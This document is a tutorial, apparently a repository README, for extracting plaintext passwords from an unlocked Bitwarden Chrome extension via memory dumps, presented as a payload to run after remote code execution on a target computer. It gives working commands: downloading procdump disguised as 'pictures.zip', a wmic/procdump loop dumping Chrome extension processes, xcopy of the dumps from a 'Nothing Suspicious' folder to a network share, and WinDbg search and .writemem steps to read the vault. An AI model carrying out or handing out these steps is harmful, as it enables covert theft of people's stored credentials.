# Retrieving and Analyzing Memory to View Passwords in a Password Manager

## About This Tutorial
This tutorial will teach you how to get plaintext passwords from an unlocked Bitwarden Web Vault Chrome browser extension using memory analysis. The idea here is that this can be used as a payload for a RCE to get the  Bitwarden passwords of a computer in use. 

### What this is **NOT**:
 - This does NOT teach you how to retreive or recover a master password for a bitwarden vault
 - This is NOT an exploit for Bitwarden, Chrome, or the Kernel

### Prerequisites to this Tutorial:

 - Windbg is installed on the Host computer, how to install this software can be found [here](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/).
 - You have access to an elevated command prompt on the target computer, or can otherwise run commands with elevated priveleges
 - The target computer has an internet connection 

## Step 1: Get a Debugger to Copy Chrome Memory
For this tutorial I'm going to use procdump, it's quite compact and doesn't require an installer, so it is perfect for this scenario. On the target computer, run the command:

    curl https://download.sysinternals.com/files/Procdump.zip -o pictures.zip

Here we just downloaded procdump as a file called "pictures.zip", an unsuspecting user might not immediately recognize this as a new file.

Next we will want to extract the .zip, we can use tar for this:

    tar -xf pictures.zip

## Step 2: Create a Memory Dump of Chrome Extensions
We are going to use wmic to get the process IDs of the running chrome extension processes, then use procdump to dump the memory to some files. We can do this in one command:

    for /f %i IN ('wmic.exe process where "CommandLine Like '%--extension-process%' and name Like 'chrome%'" get ProcessID') do (procdump.exe -accepteula -ma %i)

The output will be some .dmp files that you should copy to your Host computer. You can use xcopy, robocopy, or whatever command you'd like to copy the file to a network location. I'm going to give an example where we ran procdump in an empty folder called "Nothing Suspicious" in the ProgramData directory:

    xcopy "C:\ProgramData\Nothing Suspicious" [Network Drive Path] /s /e


## Step 3: Analyze Memory Dump to Retrieve Plaintext Passwords

On the Host computer, open up Windbg and drag and drop the memory dump into the window. 

In the command line of windbg, enter the following command:

    s-a 0`00000000 L?5000000000000 [KEYWORD]

This searches for the ascii text that is correlated with the  from the first memory address, and the search will include all of the memory addresses in the dump, unless the file size exceeds ~5GB (but in that case you have a whole other issue). Sample keywords can be found in the examples for this repo.

Copy down one of the memory addresses outputted from the previous command. Then go to View > Memory to open up the memory viewer. In the address input box, paste the address you just copied. From here you can see your vault in plaintext.

From here you can use .writemem to write the memory to file for easy viewing, the syntax is as follows:

    .writemem c:\path\to\save\export.txt startingAddress endingAddress

You can find sample memory ranges for their corresponding dump file in the Info text document. I have a few examples here using different password managers, feel free to play around with the dumps. The usernames and passwords are fake.

